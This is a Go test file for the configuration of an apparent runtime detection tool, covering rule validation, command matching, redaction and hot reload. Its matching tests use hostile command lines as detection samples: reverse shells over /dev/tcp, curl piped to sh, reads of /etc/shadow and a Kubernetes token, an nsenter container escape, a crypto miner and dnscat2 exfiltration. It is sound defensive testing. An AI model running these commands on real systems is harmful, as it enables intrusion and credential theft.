package config

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestDefaultConfigIsValid(t *testing.T) {
	cfg := Default()
	if err := cfg.Validate(); err != nil {
		t.Fatalf("the built-in ruleset does not validate: %v", err)
	}
	if len(cfg.Rules) == 0 {
		t.Fatal("the built-in ruleset is empty")
	}
	for _, r := range cfg.Rules {
		if r.Severity == "" {
			t.Errorf("rule %q has no severity", r.Name)
		}
		if r.Description == "" {
			t.Errorf("rule %q has no description; it ends up in the SIEM event", r.Name)
		}
	}
}

func TestParseRoundTrip(t *testing.T) {
	raw, err := Default().Marshal()
	if err != nil {
		t.Fatalf("Marshal: %v", err)
	}

	cfg, err := Parse(raw)
	if err != nil {
		t.Fatalf("Parse of our own output: %v", err)
	}
	if len(cfg.Rules) != len(Default().Rules) {
		t.Errorf("round trip changed the rule count: %d != %d", len(cfg.Rules), len(Default().Rules))
	}
}

func TestParseRejectsUnknownFields(t *testing.T) {
	raw := `
version: "1"
mode: trigger
rulez:
  - name: typo
`
	if _, err := Parse([]byte(raw)); err == nil {
		t.Fatal("a misspelled key was accepted; the rule would have been silently dropped")
	}
}

func TestValidateRejectsBadInput(t *testing.T) {
	cases := map[string]string{
		"invalid mode": `
mode: sometimes
rules:
  - name: r
    match: x
`,
		"duplicate rule name": `
mode: trigger
rules:
  - name: dup
    match: a
  - name: dup
    match: b
`,
		"rule with no matcher": `
mode: trigger
rules:
  - name: empty
    severity: high
`,
		"match and match_regex together": `
mode: trigger
rules:
  - name: both
    match: a
    match_regex: b
`,
		"bad regex": `
mode: trigger
rules:
  - name: bad
    match_regex: "([unclosed"
`,
		"bad severity": `
mode: trigger
rules:
  - name: r
    match: x
    severity: catastrophic
`,
		"comm too long": `
mode: trigger
rules:
  - name: r
    comm: averyverylongprocessname
`,
		"no rules in trigger mode": `
mode: trigger
rules: []
`,
		"negative retention": `
mode: trigger
retention_days: -1
rules:
  - name: r
    match: x
`,
		"zero dump size": `
mode: trigger
max_dump_size_mb: 0
rules:
  - name: r
    match: x
`,
		"bad namespace filter mode": `
mode: trigger
namespace_filter:
  mode: maybe
  namespaces: [a]
rules:
  - name: r
    match: x
`,
	}

	for name, raw := range cases {
		t.Run(name, func(t *testing.T) {
			if _, err := Parse([]byte(raw)); err == nil {
				t.Error("expected a validation error")
			}
		})
	}
}

func TestMatchLiteralAndRegex(t *testing.T) {
	cfg := Default()

	cases := []struct {
		cmdline  string
		comm     string
		wantRule string
	}{
		{"/usr/bin/cat /etc/shadow", "cat", "shadow_access"},
		{"/bin/sh -c curl -s http://x/y.sh | sh", "sh", "curl_pipe_sh"},
		{"/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "bash", "reverse_shell"},
		{"/tmp/.x/xmrig -o stratum+tcp://pool:4444", "xmrig", "crypto_miner"},
		{"nsenter --target 1 --mount --uts --ipc --net", "nsenter", "container_breakout"},
		{"cat /var/run/secrets/kubernetes.io/serviceaccount/token", "cat", "credential_harvest"},
		{"/usr/bin/ls -la", "ls", ""},
		{"/usr/bin/python3 app.py", "python3", ""},
	}

	for _, tc := range cases {
		t.Run(tc.cmdline, func(t *testing.T) {
			rule, matched := cfg.Match(tc.cmdline, tc.comm)
			if tc.wantRule == "" {
				if matched {
					t.Errorf("unexpected match on rule %q", rule.Name)
				}
				return
			}
			if !matched {
				t.Fatalf("no rule matched; expected %q", tc.wantRule)
			}
			if rule.Name != tc.wantRule {
				t.Errorf("matched %q, want %q", rule.Name, tc.wantRule)
			}
		})
	}
}

func TestMatchPrefersHigherSeverity(t *testing.T) {
	cfg := &Config{
		Mode:                          ModeTrigger,
		MaxDumpSizeMB:                 1,
		MaxDiskUsageMB:                1,
		RetentionDays:                 1,
		MaxCapturesPerMinute:          1,
		MaxCapturesPerContainerPerMin: 1,
		Rules: []Rule{
			{Name: "low_one", Match: "curl", Severity: SeverityLow},
			{Name: "critical_one", Match: "curl", Severity: SeverityCritical},
			{Name: "medium_one", Match: "curl", Severity: SeverityMedium},
		},
	}
	if err := cfg.Validate(); err != nil {
		t.Fatalf("Validate: %v", err)
	}

	rule, matched := cfg.Match("curl http://x", "curl")
	if !matched {
		t.Fatal("expected a match")
	}
	if rule.Name != "critical_one" {
		t.Errorf("matched %q, want the highest-severity rule critical_one", rule.Name)
	}
}

func TestMatchAllMode(t *testing.T) {
	cfg := Default()
	cfg.Mode = ModeAll

	rule, matched := cfg.Match("/bin/ls", "ls")
	if !matched {
		t.Fatal("capture-all mode must match every execution")
	}
	if rule.Name != "capture_all" {
		t.Errorf("synthetic rule name = %q", rule.Name)
	}
}

func TestCommScopedRule(t *testing.T) {
	cfg := &Config{
		Mode:                          ModeTrigger,
		MaxDumpSizeMB:                 1,
		MaxDiskUsageMB:                1,
		RetentionDays:                 1,
		MaxCapturesPerMinute:          1,
		MaxCapturesPerContainerPerMin: 1,
		Rules: []Rule{
			{Name: "curl_only", Match: "http", Comm: "curl", Severity: SeverityHigh},
		},
	}
	if err := cfg.Validate(); err != nil {
		t.Fatalf("Validate: %v", err)
	}

	if _, matched := cfg.Match("curl http://x", "curl"); !matched {
		t.Error("rule should match when comm and substring both match")
	}
	if _, matched := cfg.Match("wget http://x", "wget"); matched {
		t.Error("rule matched despite a different comm")
	}
}

func TestWatchesNamespace(t *testing.T) {
	cfg := Default() // exclude kube-system and flight-recorder

	if cfg.WatchesNamespace("default") != true {
		t.Error("exclude mode should watch unlisted namespaces")
	}
	if cfg.WatchesNamespace("kube-system") != false {
		t.Error("exclude mode should skip listed namespaces")
	}
	if cfg.WatchesNamespace("") != true {
		t.Error("unattributed events must be watched, or they become a blind spot")
	}

	cfg.NamespaceFilter = NamespaceFilter{Mode: FilterInclude, Namespaces: []string{"victim"}}
	if !cfg.WatchesNamespace("victim") {
		t.Error("include mode should watch listed namespaces")
	}
	if cfg.WatchesNamespace("default") {
		t.Error("include mode should skip unlisted namespaces")
	}
}

func TestPrefilterComms(t *testing.T) {
	cfg := Default()
	cfg.KernelPrefilter = true

	// The default ruleset has rules without a comm, so prefiltering must be
	// refused: enabling it would silently drop events those rules need.
	if comms := cfg.PrefilterComms(); comms != nil {
		t.Errorf("PrefilterComms = %v, want nil when any rule lacks a comm", comms)
	}

	cfg.Rules = []Rule{
		{Name: "a", Comm: "curl", Severity: SeverityHigh},
		{Name: "b", Comm: "xmrig", Severity: SeverityHigh},
	}
	comms := cfg.PrefilterComms()
	if len(comms) != 2 {
		t.Fatalf("PrefilterComms = %v, want 2 entries", comms)
	}

	cfg.KernelPrefilter = false
	if comms := cfg.PrefilterComms(); comms != nil {
		t.Error("prefilter comms returned while prefiltering is disabled")
	}
}

func TestRedactionRegexes(t *testing.T) {
	cfg := Default()
	cfg.RedactionEnabled = true

	res, names, err := cfg.RedactionRegexes()
	if err != nil {
		t.Fatalf("RedactionRegexes: %v", err)
	}
	if len(res) != len(names) || len(res) == 0 {
		t.Fatalf("got %d regexes and %d names", len(res), len(names))
	}

	// The built-in patterns must actually match the things they claim to.
	samples := map[string]bool{
		"4111111111111111":                         true,
		"123-45-6789":                              true,
		"person@example.com":                       true,
		"AKIAIOSFODNN7EXAMPLE":                     true,
		"ghp_1234567890abcdefghijklmnopqrstuvwxyz": true,
		"nothing sensitive here":                   false,
	}
	for sample, want := range samples {
		matched := false
		for _, re := range res {
			if re.MatchString(sample) {
				matched = true
				break
			}
		}
		if matched != want {
			t.Errorf("sample %q matched=%v, want %v", sample, matched, want)
		}
	}

	cfg.RedactionPatterns = []string{"([unclosed"}
	if _, _, err := cfg.RedactionRegexes(); err == nil {
		t.Error("a malformed redaction pattern was accepted")
	}
}

func TestLoadFile(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "triggers.yaml")

	raw, err := Default().Marshal()
	if err != nil {
		t.Fatalf("Marshal: %v", err)
	}
	if err := os.WriteFile(path, raw, 0o600); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	cfg, err := Load(path)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if len(cfg.Rules) == 0 {
		t.Error("loaded config has no rules")
	}

	if _, err := Load(filepath.Join(dir, "missing.yaml")); err == nil {
		t.Error("expected an error for a missing file")
	}
}

func TestStoreHotReload(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "triggers.yaml")

	initial := `
version: "1"
mode: trigger
rules:
  - name: first
    match: alpha
    severity: high
`
	if err := os.WriteFile(path, []byte(initial), 0o600); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	store := NewStore(Default())
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	reloaded := make(chan *Config, 4)
	store.OnReload(func(c *Config) { reloaded <- c })

	if err := store.Watch(ctx, path, func(err error) { t.Logf("watch error: %v", err) }); err != nil {
		t.Fatalf("Watch: %v", err)
	}

	if got := store.Get().Rules[0].Name; got != "first" {
		t.Fatalf("initial rule = %q, want first", got)
	}

	updated := `
version: "1"
mode: trigger
rules:
  - name: second
    match: beta
    severity: critical
`
	if err := os.WriteFile(path, []byte(updated), 0o600); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	select {
	case cfg := <-reloaded:
		if cfg.Rules[0].Name != "second" {
			t.Errorf("reloaded rule = %q, want second", cfg.Rules[0].Name)
		}
	case <-time.After(10 * time.Second):
		t.Fatal("timed out waiting for a hot reload")
	}

	if got := store.Get().Rules[0].Name; got != "second" {
		t.Errorf("store still serves %q after reload", got)
	}
	if store.Reloads() == 0 {
		t.Error("reload counter did not advance")
	}
}

func TestStoreKeepsPreviousConfigOnBadReload(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "triggers.yaml")

	good := `
version: "1"
mode: trigger
rules:
  - name: good
    match: alpha
    severity: high
`
	if err := os.WriteFile(path, []byte(good), 0o600); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	store := NewStore(Default())
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	if err := store.Watch(ctx, path, nil); err != nil {
		t.Fatalf("Watch: %v", err)
	}

	if err := os.WriteFile(path, []byte("mode: nonsense\nrules: []\n"), 0o600); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}

	if err := store.Reload(); err == nil {
		t.Fatal("Reload accepted an invalid ruleset")
	}
	if got := store.Get().Rules[0].Name; got != "good" {
		t.Errorf("store serves %q; a rejected reload must leave the previous ruleset active", got)
	}
}

func TestSeverityRank(t *testing.T) {
	if SeverityCritical.Rank() <= SeverityHigh.Rank() ||
		SeverityHigh.Rank() <= SeverityMedium.Rank() ||
		SeverityMedium.Rank() <= SeverityLow.Rank() {
		t.Error("severity ordering is wrong")
	}
	if Severity("unknown").Rank() != 0 {
		t.Error("unknown severities should rank 0")
	}
}

func TestDefaultRulesetCoversPlannedScenarios(t *testing.T) {
	// The build plan names five red-team scenarios that must be covered by
	// the shipped ruleset. This test is the contract.
	cfg := Default()
	scenarios := map[string]string{
		"reverse shell":    "/bin/bash -i >& /dev/tcp/203.0.113.5/4444 0>&1",
		"fileless payload": "/bin/sh -c curl -s http://198.51.100.9/p.sh | sh",
		"cryptominer":      "/tmp/xmrig --url stratum+tcp://pool.example:3333",
		"dns exfiltration": "/usr/bin/dnscat2 --dns server=198.51.100.9",
		"container escape": "/usr/bin/nsenter --target 1 --mount /bin/sh",
	}

	for name, cmdline := range scenarios {
		fields := strings.Fields(cmdline)
		comm := filepath.Base(fields[0])
		if _, matched := cfg.Match(cmdline, comm); !matched {
			t.Errorf("%s scenario is not covered by the default ruleset: %q", name, cmdline)
		}
	}
}
